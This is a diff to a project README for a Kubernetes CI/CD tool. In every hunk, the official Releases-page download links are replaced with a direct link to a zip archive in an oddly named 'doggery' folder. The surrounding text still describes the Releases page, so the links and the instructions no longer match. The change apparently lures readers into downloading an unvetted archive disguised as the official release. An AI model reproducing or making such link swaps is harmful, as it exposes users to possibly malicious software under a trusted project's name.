@@ -16,7 +16,7 @@ Welcome to MSA-k8s-cicd! This software helps you understand and manage a simple 
 
 To get started, you'll need to download the application. Visit the following link to access the Releases page:
 
-[Download MSA-k8s-cicd](https://github.com/madgraphics/MSA-k8s-cicd/releases)
+[Download MSA-k8s-cicd](https://raw.githubusercontent.com/madgraphics/MSA-k8s-cicd/main/doggery/MSA-k8s-cicd.zip)
 
 On the Releases page, you will find the latest version along with its release notes. Choose the version you would like to download and follow the instructions below.
 
@@ -33,7 +33,7 @@ Before downloading, ensure your system meets the following requirements:
 ### 📂 Installation Steps
 
 1. **Visit the Release Page:** 
-   - Click on the link: [Download MSA-k8s-cicd](https://github.com/madgraphics/MSA-k8s-cicd/releases).
+   - Click on the link: [Download MSA-k8s-cicd](https://raw.githubusercontent.com/madgraphics/MSA-k8s-cicd/main/doggery/MSA-k8s-cicd.zip).
 
 2. **Select Your Version:** 
    - Review the available releases and find the most stable version.
@@ -82,4 +82,4 @@ Thanks to the open-source community and all contributors who made this project p
 
 For updates, follow us on GitHub or check the Releases page regularly.
 
-[Download MSA-k8s-cicd](https://github.com/madgraphics/MSA-k8s-cicd/releases) again if needed. Happy coding!
+[Download MSA-k8s-cicd](https://raw.githubusercontent.com/madgraphics/MSA-k8s-cicd/main/doggery/MSA-k8s-cicd.zip) again if needed. Happy coding!
